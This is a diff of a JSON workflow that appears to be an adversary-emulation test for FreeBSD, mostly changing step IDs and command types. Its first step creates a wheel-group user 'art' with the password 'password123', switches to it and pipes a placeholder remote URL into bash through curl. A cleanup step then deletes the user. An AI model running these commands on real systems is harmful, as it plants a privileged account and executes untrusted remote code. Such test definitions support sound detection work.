@@ -7,87 +7,87 @@
   ],
   "steps": [
     {
-      "id": "b01f0cf3-35e9-40f4-9bac-c5ab8633a540",
+      "id": "a42477dd-8316-4957-b64b-2bb50da1fc85",
       "type": "execute-command",
       "data": {
-        "command": "pw adduser art -g wheel -s /bin/sh\necho \"password123\" | pw usermod art -h 0\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n",
+        "command": "pw adduser art -g wheel -s /bin/sh\necho \"password123\" | pw usermod art -h 0\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash",
         "command_type": "bash"
       },
       "elevation_required": true
     },
     {
-      "id": "73b4bc26-1d7a-426d-bbd9-f88ee84926e7",
+      "id": "ca9192df-5154-4638-a7b7-bd33e4164d72",
       "type": "execute-command",
       "data": {
-        "command": "rmuser -y art\n",
+        "command": "rmuser -y art",
         "command_type": "bash"
       },
       "elevation_required": true
     },
     {
-      "id": "201c5dc2-c8cd-4208-aee6-bfa9b7290578",
+      "id": "aa419755-0222-4098-9551-f5b6aa2c0422",
       "name": "Check dependency 1/1",
       "description": "Check if running on a FreeBSD based machine.\n",
       "type": "execute-command",
       "data": {
-        "command": "if grep -iq \"FreeBSD\" /etc/os-release; then echo \"FreeBSD\"; else echo \"NOT FreeBSD\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v bash)\" ]; then echo \"bash is installed\"; else echo \"bash is NOT installed\"; exit 1; fi\n",
-        "command_type": ""
+        "command": "if grep -iq \"FreeBSD\" /etc/os-release; then echo \"FreeBSD\"; else echo \"NOT FreeBSD\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v bash)\" ]; then echo \"bash is installed\"; else echo \"bash is NOT installed\"; exit 1; fi",
+        "command_type": "bash"
       },
       "elevation_required": true
     },
     {
-      "id": "1674af3e-edd5-4a8a-804a-3470b4d1f289",
+      "id": "37714f7e-2f84-430d-84d0-2345430c2a40",
       "name": "Resolve dependency 1/1",
       "description": "Check if running on a FreeBSD based machine.\n",
       "type": "execute-command",
       "data": {
-        "command": "pkg update \u0026\u0026 pkg install -y sudo curl bash\n",
-        "command_type": ""
+        "command": "pkg update \u0026\u0026 pkg install -y sudo curl bash",
+        "command_type": "bash"
       },
       "elevation_required": true
     },
     {
-      "id": "ec8080a0-c634-4447-ab19-7d2ecce605bb",
+      "id": "c6004b25-53bf-4550-873e-0482a794d0a4",
       "name": "Re-check dependency 1/1",
       "description": "Check if running on a FreeBSD based machine.\n",
       "type": "execute-command",
       "data": {
-        "command": "if grep -iq \"FreeBSD\" /etc/os-release; then echo \"FreeBSD\"; else echo \"NOT FreeBSD\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v bash)\" ]; then echo \"bash is installed\"; else echo \"bash is NOT installed\"; exit 1; fi\n",
-        "command_type": ""
+        "command": "if grep -iq \"FreeBSD\" /etc/os-release; then echo \"FreeBSD\"; else echo \"NOT FreeBSD\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v bash)\" ]; then echo \"bash is installed\"; else echo \"bash is NOT installed\"; exit 1; fi",
+        "command_type": "bash"
       },
       "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "b01f0cf3-35e9-40f4-9bac-c5ab8633a540",
+      "s": "a42477dd-8316-4957-b64b-2bb50da1fc85",
       "p": "on-success",
-      "o": "73b4bc26-1d7a-426d-bbd9-f88ee84926e7"
+      "o": "ca9192df-5154-4638-a7b7-bd33e4164d72"
     },
     {
-      "s": "b01f0cf3-35e9-40f4-9bac-c5ab8633a540",
+      "s": "a42477dd-8316-4957-b64b-2bb50da1fc85",
       "p": "on-failure",
-      "o": "73b4bc26-1d7a-426d-bbd9-f88ee84926e7"
+      "o": "ca9192df-5154-4638-a7b7-bd33e4164d72"
     },
     {
-      "s": "201c5dc2-c8cd-4208-aee6-bfa9b7290578",
+      "s": "aa419755-0222-4098-9551-f5b6aa2c0422",
       "p": "on-success",
-      "o": "b01f0cf3-35e9-40f4-9bac-c5ab8633a540"
+      "o": "a42477dd-8316-4957-b64b-2bb50da1fc85"
     },
     {
-      "s": "201c5dc2-c8cd-4208-aee6-bfa9b7290578",
+      "s": "aa419755-0222-4098-9551-f5b6aa2c0422",
       "p": "on-failure",
-      "o": "1674af3e-edd5-4a8a-804a-3470b4d1f289"
+      "o": "37714f7e-2f84-430d-84d0-2345430c2a40"
     },
     {
-      "s": "1674af3e-edd5-4a8a-804a-3470b4d1f289",
+      "s": "37714f7e-2f84-430d-84d0-2345430c2a40",
       "p": "on-success",
-      "o": "ec8080a0-c634-4447-ab19-7d2ecce605bb"
+      "o": "c6004b25-53bf-4550-873e-0482a794d0a4"
     },
     {
-      "s": "ec8080a0-c634-4447-ab19-7d2ecce605bb",
+      "s": "c6004b25-53bf-4550-873e-0482a794d0a4",
       "p": "on-failure",
-      "o": "b01f0cf3-35e9-40f4-9bac-c5ab8633a540"
+      "o": "a42477dd-8316-4957-b64b-2bb50da1fc85"
     }
   ],
   "tags": [
